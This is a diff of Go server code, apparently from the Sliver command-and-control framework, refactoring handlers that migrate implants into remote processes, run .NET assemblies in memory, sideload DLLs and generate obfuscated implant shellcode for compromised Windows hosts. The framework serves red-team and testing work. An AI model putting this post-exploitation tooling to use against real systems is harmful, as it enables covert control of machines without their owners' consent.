@@ -26,6 +26,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/Binject/debug/pe"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
@@ -33,16 +34,15 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
-	"github.com/bishopfox/sliver/server/cryptography"
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/db/models"
 	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/sgn"
+	"github.com/bishopfox/sliver/util"
 
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
-	"google.golang.org/protobuf/proto"
 )
 
 var (
@@ -62,32 +62,82 @@ func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.T
 // Migrate - Migrate to a new process on the remote system (Windows only)
 func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
 	var shellcode []byte
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+	var session *core.Session
+	var beacon *clientpb.Beacon
+	var dbBeacon *models.Beacon
+	var err error
+
+	if !req.Request.Async { // is this a session?
+		session = core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+	} else { // then it must be a beacon
+		dbBeacon, err = db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			tasksLog.Errorf("%s", err)
+			return nil, ErrDatabaseFailure
+		}
+		beacon = dbBeacon.ToProtobuf()
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
 	}
-	name := filepath.Base(req.Config.GetName())
+
+	name := filepath.Base(req.Name)
 	shellcode, arch, err := getSliverShellcode(name)
 	if err != nil {
-		name, config := generate.ImplantConfigFromProtobuf(req.Config)
-		if name == "" {
+		config := req.Config
+		if req.Name == "" {
 			name, err = codenames.GetCodename()
 			if err != nil {
 				return nil, err
 			}
+		} else if err := util.AllowedName(name); err != nil {
+			return nil, err
+		} else {
+			name = req.Name
 		}
 		config.Format = clientpb.OutputFormat_SHELLCODE
+		// Tweak some of the config parameters
+		config.IsShellcode = true
+		config.IsSharedLib = false
+		config.TemplateName = "sliver"
 		config.ObfuscateSymbols = true
-		otpSecret, _ := cryptography.TOTPServerSecret()
-		err = generate.GenerateConfig(name, config, true)
+		build, err := generate.GenerateConfig(name, config)
 		if err != nil {
 			return nil, err
 		}
-		shellcodePath, err := generate.SliverShellcode(name, otpSecret, config, true)
+
+		// retrieve http c2 implant config
+		httpC2Config, err := db.LoadHTTPC2ConfigByName(req.Config.HTTPC2ConfigName)
+		if err != nil {
+			return nil, err
+		}
+
+		shellcodePath, err := generate.SliverShellcode(name, build, config, httpC2Config.ImplantConfig)
 		if err != nil {
 			return nil, err
 		}
 		shellcode, _ = os.ReadFile(shellcodePath)
+		// Save the implant config in the database so that the server recognizes it when it tries to connect
+		config.ID = ""
+		savedConfig, err := db.SaveImplantConfig(config)
+		if err != nil {
+			return nil, err
+		}
+		build.ImplantConfigID = savedConfig.ID
+
+		/* Save the build in the database so that the server recognizes it when it tries to connect
+		   This build will have the same name as the implant it is being spawned from, so
+		   we need to create a unique name for the database
+		*/
+		build.Name = fmt.Sprintf("%s_%d", build.Name, time.Now().Unix())
+		_, err = db.SaveImplantBuild(build)
+		if err != nil {
+			return nil, err
+		}
+
 	}
 
 	if len(shellcode) < 1 {
@@ -104,31 +154,28 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 
 	}
 
-	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
-		Request: req.Request,
-		Data:    shellcode,
-		Pid:     req.Pid,
-	})
+	migrateReq := &sliverpb.InvokeMigrateReq{
+		Request:  req.Request,
+		Data:     shellcode,
+		Pid:      req.Pid,
+		ProcName: req.ProcName,
+	}
+
+	resp := &sliverpb.Migrate{Response: &commonpb.Response{}}
+	err = rpc.GenericHandler(migrateReq, resp)
+
 	if err != nil {
 		return nil, err
 	}
-	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
-	if err != nil {
-		return nil, err
-	}
-	resp := &sliverpb.Migrate{}
-	err = proto.Unmarshal(respData, resp)
-	if err != nil {
-		return nil, err
-	}
+
 	return resp, nil
 }
 
 // ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
 func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
 	var session *core.Session
-	var beacon *models.Beacon
+	var beacon *clientpb.Beacon
+	var dbBeacon *models.Beacon
 	var err error
 	if !req.Request.Async {
 		session = core.Sessions.Get(req.Request.SessionID)
@@ -136,11 +183,12 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 			return nil, ErrInvalidSessionID
 		}
 	} else {
-		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		dbBeacon, err = db.BeaconByID(req.Request.BeaconID)
 		if err != nil {
 			tasksLog.Errorf("%s", err)
 			return nil, ErrDatabaseFailure
 		}
+		beacon = dbBeacon.ToProtobuf()
 		if beacon == nil {
 			return nil, ErrInvalidBeaconID
 		}
@@ -192,10 +240,11 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 // Sideload - Sideload a DLL on the remote system (Windows only)
 func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
 	var (
-		session *core.Session
-		beacon  *models.Beacon
-		err     error
-		arch    string
+		session  *core.Session
+		beacon   *clientpb.Beacon
+		dbBeacon *models.Beacon
+		err      error
+		arch     string
 	)
 	if !req.Request.Async {
 		session = core.Sessions.Get(req.Request.SessionID)
@@ -204,11 +253,12 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 		}
 		arch = session.Arch
 	} else {
-		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		dbBeacon, err = db.BeaconByID(req.Request.BeaconID)
 		if err != nil {
 			msfLog.Errorf("%s", err)
 			return nil, ErrDatabaseFailure
 		}
+		beacon = dbBeacon.ToProtobuf()
 		if beacon == nil {
 			return nil, ErrInvalidBeaconID
 		}
@@ -216,7 +266,7 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 	}
 
 	if getOS(session, beacon) == "windows" {
-		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, req.Args, "", req.EntryPoint, req.IsDLL, req.IsUnicode)
+		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, req.Args, "", req.EntryPoint, req.IsDLL, req.IsUnicode, false)
 		if err != nil {
 			tasksLog.Errorf("Sideload failed: %s", err)
 			return nil, err
@@ -241,7 +291,8 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 // SpawnDll - Spawn a DLL on the remote system (Windows only)
 func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq) (*sliverpb.SpawnDll, error) {
 	var session *core.Session
-	var beacon *models.Beacon
+	var beacon *clientpb.Beacon
+	var dbBeacon *models.Beacon
 	var err error
 	if !req.Request.Async {
 		session = core.Sessions.Get(req.Request.SessionID)
@@ -249,11 +300,12 @@ func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq
 			return nil, ErrInvalidSessionID
 		}
 	} else {
-		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		dbBeacon, err = db.BeaconByID(req.Request.BeaconID)
 		if err != nil {
 			msfLog.Errorf("%s", err)
 			return nil, ErrDatabaseFailure
 		}
+		beacon = dbBeacon.ToProtobuf()
 		if beacon == nil {
 			return nil, ErrInvalidBeaconID
 		}
@@ -281,7 +333,7 @@ func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq
 	return resp, nil
 }
 
-func getOS(session *core.Session, beacon *models.Beacon) string {
+func getOS(session *core.Session, beacon *clientpb.Beacon) string {
 	if session != nil {
 		return session.OS
 	}
@@ -299,7 +351,12 @@ func getSliverShellcode(name string) ([]byte, string, error) {
 		return nil, "", err
 	}
 
-	switch build.ImplantConfig.Format {
+	config, err := db.ImplantConfigByID(build.ImplantConfigID)
+	if err != nil {
+		return nil, "", err
+	}
+
+	switch config.Format {
 
 	case clientpb.OutputFormat_SHELLCODE:
 		fileData, err := generate.ImplantFileFromBuild(build)
@@ -315,7 +372,7 @@ func getSliverShellcode(name string) ([]byte, string, error) {
 		if err != nil {
 			return []byte{}, "", err
 		}
-		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", false, false)
+		data, err = generate.DonutShellcodeFromPE(fileData, config.GOARCH, false, "", "", "", false, false, false)
 		if err != nil {
 			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
 			return []byte{}, "", err
@@ -338,7 +395,7 @@ func getSliverShellcode(name string) ([]byte, string, error) {
 		err = fmt.Errorf("no existing shellcode found")
 	}
 
-	return data, build.ImplantConfig.GOARCH, err
+	return data, config.GOARCH, err
 }
 
 // ExportDirectory - stores the Export data
